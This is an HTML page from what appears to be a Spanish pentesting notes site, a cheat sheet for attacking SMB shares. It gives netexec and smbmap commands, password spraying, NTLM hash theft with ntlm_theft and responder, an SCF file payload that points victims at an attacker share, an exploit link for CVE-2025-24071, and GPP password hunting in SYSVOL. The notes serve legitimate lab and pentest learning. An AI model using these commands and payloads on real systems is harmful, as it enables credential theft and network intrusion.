@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxc smb IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb IP
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb IP <span class="nt">-u</span> <span class="s1">'USER'</span> <span class="nt">-p</span> <span class="s1">'PASS'</span> <span class="nt">-d</span> DOMAIN <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<h1 id="password-spraying-hacerlo-cuando-no-se-encuentra-nada">Password spraying (hacerlo cuando no se encuentra nada)</h1>
+
+<p>Probarlo con:</p>
+<ul>
+  <li>Una contraseña válida para un usuario (quizás sea válido para otro)</li>
+  <li>Contraseña = usuario</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb IP <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">-d</span> DOMAIN <span class="nt">--continue-on-success</span> <span class="nt">--no-bruteforce</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb IP <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s2">"password"</span> <span class="nt">-d</span> DOMAIN <span class="nt">--continue-on-success</span> <span class="nt">--no-bruteforce</span>
+</code></pre></div></div>
+
+<hr />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+use auxiliary/scanner/smb/smb_enumshares
+<span class="nb">set </span>RHOSTS IP_DEL_SERVIDOR
+run
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> IP <span class="nt">-u</span> <span class="s1">'null'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> IP <span class="nt">-u</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> IP <span class="nt">-N</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> IP <span class="nt">-u</span> USER <span class="nt">-p</span> <span class="s1">'PASS'</span>
+</code></pre></div></div>
+
+<h1 id="a-veces-se-buguean-los-permisos-mejor-hacerlo-con-">A veces se buguean los permisos, mejor hacerlo con :</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb IP <span class="nt">-u</span> USER  <span class="nt">-p</span> PASS  <span class="nt">-d</span> DOMAIN <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<hr />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //IP/NOMBRE_RECURSO <span class="nt">-U</span> USER%PASS
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> IP <span class="nt">-N</span> <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=SMB2'</span>
+</code></pre></div></div>
+
+<p>Descargar de forma <strong>recursiva</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>recurse
+prompt
+mget *
+</code></pre></div></div>
+
+<p>Configuración de samba</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/samba/smb.conf
+</code></pre></div></div>
+
+<p>SMB</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
+HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
+</code></pre></div></div>
+
+<h1 id="como-robar-hashes-si-tengo-permisos-de-escritura">Como robar hashes si tengo permisos de escritura:</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Greenwolf/ntlm_theft.git
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlm_theft.py <span class="nt">-g</span> all <span class="nt">-s</span> IP-ATACANTE <span class="nt">-f</span> <span class="nb">test</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //IP/RESOURCE <span class="nt">-U</span> USER <span class="s1">'PASS'</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prompt
+mput *
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+</code></pre></div></div>
+
+<hr />
+
+<p>SCF file attack</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
+Command=2
+IconFile=\\X.X.X.X\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p>SMB relay</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">-wdv</span>
+</code></pre></div></div>
+
+<h1 id="con-kerberos">Con kerberos</h1>
+
+<pre><code class="language-BASH">nxc smb DC.domain -u 'USER' -p 'PASS' -k --shares
+</code></pre>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/smbclient.py <span class="nt">-k</span> DOMAIN/USER@DC.DOMAIN <span class="nt">-no-pass</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="cve-2025-24071">CVE-2025-24071</h1>
+
+<p><a href="https://sploitus.com/exploit?id=B7436966-38EB-53C7-9295-00D0322061AC">💀 Exploit for CVE-2025-24071</a></p>
+
+<h2 id="️-quiénes-son-vulnerables">🛠️ ¿Quiénes son vulnerables?</h2>
+
+<p>Según fuentes como NVD y CVEdetails, están afectados los siguientes sistemas si <strong>no están actualizados</strong>:</p>
+
+<h3 id="windows-server">Windows Server:</h3>
+
+<ul>
+  <li>
+    <p><strong>Windows Server 2012 R2</strong>.</p>
+  </li>
+  <li>
+    <p><strong>Windows Server 2016</strong> (builds antes de 10.0.14393.7876).</p>
+  </li>
+  <li>
+    <p><strong>Windows Server 2019</strong> (builds antes de 10.0.17763.7009).</p>
+  </li>
+  <li>
+    <p><strong>Windows Server 2022</strong> (builds antes de 10.0.20348.3328).</p>
+  </li>
+  <li>
+    <p><strong>Windows Server 2025 / 2022 23H2</strong> (builds antes de 10.0.25398.1486 y 10.0.26100.3476) <a href="https://www.cvedetails.com/cve/CVE-2025-24071/?utm_source=chatgpt.com">tenable.com+2cvedetails.com+2nvd.nist.gov+2</a>.</p>
+  </li>
+</ul>
+
+<h3 id="windows-10">Windows 10:</h3>
+
+<ul>
+  <li>
+    <p><strong>1507</strong> (x86/x64): versiones anteriores a 10.0.10240.20947.</p>
+  </li>
+  <li>
+    <p><strong>1607</strong> (x86/x64): versiones anteriores a 10.0.14393.7876.</p>
+  </li>
+  <li>
+    <p><strong>1809</strong> (x86/x64): versiones anteriores a 10.0.17763.7009.</p>
+  </li>
+  <li>
+    <p><strong>21H2</strong>, <strong>22H2</strong> (x64/ARM64/32‑bit): versiones anteriores a los builds correspondientes <a href="https://www.cvedetails.com/cve/CVE-2025-24071/?utm_source=chatgpt.com">cvedetails.com+1nvd.nist.gov+1</a><a href="https://github.com/ThemeHackers/CVE-2025-24071?utm_source=chatgpt.com">github.com</a>.</p>
+  </li>
+</ul>
+
+<h3 id="windows-11">Windows 11:</h3>
+
+<ul>
+  <li>
+    <p><strong>23H2</strong> (x64/ARM64): antes de 10.0.22631.5039.</p>
+  </li>
+  <li>
+    <p><strong>24H2</strong> (x64/ARM64): antes de 10.0.26100.3476 <a href="https://www.cvedetails.com/cve/CVE-2025-24071/?utm_source=chatgpt.com">rapid7.com+3cvedetails.com+3github.com+3</a>.</p>
+  </li>
+</ul>
+
+<p>Para ver la versión :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c ver
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ComputerInfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">OsName</span><span class="p">,</span><span class="w"> </span><span class="nx">OsVersion</span><span class="p">,</span><span class="w"> </span><span class="nx">OsBuildNumber</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb IP <span class="nt">-d</span> DOMAIN
+</code></pre></div></div>
+
+<h1 id="sysvol--policies"><strong>SYSVOL &gt; Policies</strong></h1>
+
+<p>El directorio <code class="language-plaintext highlighter-rouge">Policies\</code> en SMB suele encontrarse en entornos Windows, especialmente en servidores que gestionan <strong>Active Directory (AD)</strong> y políticas de grupo (<strong>Group Policy Objects - GPOs</strong>). Este directorio normalmente se encuentra en la <strong>SYSVOL</strong> compartida de un <strong>Controlador de Dominio (DC)</strong> y contiene configuraciones importantes para los clientes del dominio.</p>
+
+<hr />
+
+<h3 id="-contenido-típico-de-policies-en-smb"><strong>📂 Contenido típico de <code class="language-plaintext highlighter-rouge">Policies\</code> en SMB</strong></h3>
+
+<p>Si accedes a un servidor SMB y ves una carpeta <code class="language-plaintext highlighter-rouge">Policies\</code>, es probable que contenga:</p>
+
+<ol>
+  <li>
+    <p><strong>Identificadores de GPOs (GUIDs)</strong></p>
+
+    <ul>
+      <li>Cada política de grupo se almacena en una carpeta con un <strong>GUID</strong> (por ejemplo, <code class="language-plaintext highlighter-rouge">{31B2F340-016D-11D2-945F-00C04FB984F9}</code>).</li>
+      <li>Estas carpetas contienen la configuración de la política aplicada a usuarios y computadoras en el dominio.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Archivos <code class="language-plaintext highlighter-rouge">GPT.INI</code></strong></p>
+
+    <ul>
+      <li>Un archivo <code class="language-plaintext highlighter-rouge">GPT.INI</code> dentro de cada política define la versión de la política de grupo.</li>
+      <li>Ejemplo de contenido:</li>
+    </ul>
+
+    <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="nn">[General]</span>
+     <span class="py">Version</span><span class="p">=</span><span class="s">2</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p><strong>Carpeta <code class="language-plaintext highlighter-rouge">Machine\</code></strong></p>
+
+    <ul>
+      <li>Contiene configuraciones aplicadas a <strong>todas las máquinas</strong> dentro del dominio.</li>
+      <li>Puede incluir:
+        <ul>
+          <li><strong><code class="language-plaintext highlighter-rouge">Registry.pol</code></strong> (configuración del registro para equipos del dominio)</li>
+          <li><strong><code class="language-plaintext highlighter-rouge">Scripts\</code></strong> (scripts de inicio o cierre de sesión)</li>
+          <li><strong><code class="language-plaintext highlighter-rouge">Adm\</code></strong> (plantillas administrativas antiguas)</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Carpeta <code class="language-plaintext highlighter-rouge">User\</code></strong></p>
+
+    <ul>
+      <li>Contiene configuraciones aplicadas a <strong>usuarios</strong> del dominio.</li>
+      <li>Similar a <code class="language-plaintext highlighter-rouge">Machine\</code>, puede incluir:
+        <ul>
+          <li><strong><code class="language-plaintext highlighter-rouge">Registry.pol</code></strong> (modificaciones del registro para usuarios)</li>
+          <li><strong>Scripts de inicio/cierre de sesión</strong>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Carpeta <code class="language-plaintext highlighter-rouge">Preferences\</code></strong></p>
+
+    <ul>
+      <li>Almacena configuraciones de <strong>Group Policy Preferences (GPP)</strong>.</li>
+      <li>Puede contener archivos XML con <strong>credenciales cifradas</strong>, lo que es un objetivo interesante en pruebas de seguridad.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Archivos de scripts (<code class="language-plaintext highlighter-rouge">.bat</code>, <code class="language-plaintext highlighter-rouge">.cmd</code>, <code class="language-plaintext highlighter-rouge">.vbs</code>, <code class="language-plaintext highlighter-rouge">.ps1</code>)</strong></p>
+
+    <ul>
+      <li>Se usan para automatizar configuraciones en máquinas y usuarios cuando inician sesión.</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h3 id="-importancia-de-policies-en-pruebas-de-seguridad"><strong>📌 Importancia de <code class="language-plaintext highlighter-rouge">Policies\</code> en pruebas de seguridad</strong></h3>
+
+<ul>
+  <li>Puede contener <strong>contraseñas cifradas en XML</strong> dentro de <code class="language-plaintext highlighter-rouge">Preferences\</code> (se pueden descifrar con herramientas como <code class="language-plaintext highlighter-rouge">gpp-decrypt</code>).</li>
+  <li>Puede permitir la manipulación de políticas si el atacante tiene permisos de escritura (<code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> o <code class="language-plaintext highlighter-rouge">SeRestorePrivilege</code>).</li>
+  <li>La presencia de scripts puede ser útil para la <strong>ejecución de código remoto</strong> en equipos del dominio.</li>
+</ul>
+
+<p>Si estás analizando SMB en un entorno Windows, revisar <code class="language-plaintext highlighter-rouge">Policies\</code> puede proporcionar información valiosa sobre configuraciones de dominio y posibles vectores de ataque. 🚀</p>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
